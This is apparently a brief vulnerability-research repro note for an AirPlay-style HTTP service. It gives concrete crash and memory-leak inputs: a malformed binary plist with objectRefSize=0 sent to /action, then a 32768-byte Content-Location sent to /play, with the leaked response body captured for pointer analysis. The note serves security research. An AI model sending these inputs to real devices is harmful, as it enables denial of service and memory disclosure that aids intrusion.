# Two-step repro (leak hunt)
1. POST /action with a valid bplist whose trailer has objectRefSize=0  -> deterministic crash (heap becomes "trained")
2. POST /play  with {"Content-Location":"A"*32768, "type":96}          -> previously observed HTTP/1.1 200 OK *then* crash;
   capture that 200 body and run leak analysis (pointer-shaped words / printable runs / entropy).
Repeat the pair; the 200-with-body case is state-dependent.
